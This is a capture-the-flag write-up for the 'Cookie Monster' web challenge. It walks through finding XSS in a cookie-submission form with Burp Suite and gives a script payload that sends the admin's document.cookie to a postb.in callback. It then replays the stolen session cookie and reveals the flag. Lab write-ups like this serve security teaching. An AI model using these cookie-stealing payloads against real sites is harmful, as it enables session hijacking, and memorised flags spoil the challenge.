# WORK IN PROGRESS

# Cookie Monster
* **Category**: Web Security
* **Points**: 200
* **Challenge**: Lets make some yummy cookies! Maybe you can even find some extra tasty ones: http://challenge.acictf.com:27734.
* **Hint #1**: If only we could inspect the device's memory while it is running...
* **Hint #2**: You can control the value so select all you want.
* **Hint #3**: If you need an endpoint for a callback, postb.in is a useful resource. You could also run a simple server on the competition's shell server using a command like python -m SimpleHTTPServer.

<br />

First lets navigate to the challenge in a web browser:
```
http://challenge.acictf.com:27734.
```
![cookiemonster](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/cookiemonster.JPG)

Based on the name of the challenge and some of the hints, we can assume that we are going to [stealing cookies via XSS](https://www.openlearning.com/u/ivanteong/blog/StealingCookiesViaXssUsingPhpOrRequestbin/).  Lets submit a cookie to the cookie monster (random name and ingredients) and [capture the POST request in Burp Suite](https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started):

<br />

![burp1](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/burp1.JPG)

<br />

There are two parameters potentially vulnerable to XSS, *name* and *ingredients*.  Lets use a simple JavaScript alert to see if the site is vulnerable to Reflected XSS:
```
<script>alert("XSS!")</script>
```

<br /> 

Now place the JavaScript alert in place of one of the ingredients in Burp Suite: 
```
name=Sugar&ingredients=<script>alert("XSS!")</script>&ingredients=sugar&ingredients=eggs&ingredients=Add+ingredient
```

<br /> 

Forward the POST request Burp Suite and we get an alert message on the next page:

<br /> 

![alert](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/alert.JPG)

<br /> 

Now that we know the site is vulnerable to XSS, we can use that to obtain the admin session cookie.  When we slected submit cookie for approval we recived another alert message and a statement saying taht the cookie monster is viewing our cookie.  That will be the point where we should get the cookie.

Use postb.in to received the admin cookie from the victims browser.  After selecting *create bin*, use the URL to craft malicious JavaScript: 
```
<script>new Image().src='https://postb.in/1589765685538-7717803197447/malicious.php?code='%2Bdocument.cookie</script>
```

<br /> 

Inject the malicious Javascript into the POST just like we did with the alert messsage:
and submit the cookie for approval
```
name=Sugar&ingredients=<script>new Image().src='https://postb.in/1589765685538-7717803197447/malicious.php?code='%2Bdocument.cookie</script>&ingredients=sugar&ingredients=eggs&ingredients=Add+ingredient
```

Refresh the PostBin page and you should see the admin cookie:

<br />

![admincookie](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/admincookie.JPG)

<br />

Now that we have the admin cookie 'b4697910-6dbc-4836-851b-a14e7a5bb7d0', we can use this to navigate to the *Cookie Admin* page.  Intercept the GET request in BurpSuite and replace your cookie with the admin cookie:

![burp2](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/burp2.JPG)

<br />

We are presented with a page with a link to *Flag Cookie*.  Click it to get the flag:


<br />

![flagcookie](https://github.com/eesantiago/Writeups/blob/master/CyberStakes_2020/cookie_monster/screenshots/flagcookie.JPG)

<br />

## Flag: ACI{07c3bc112a56b3d9512b6a54148}



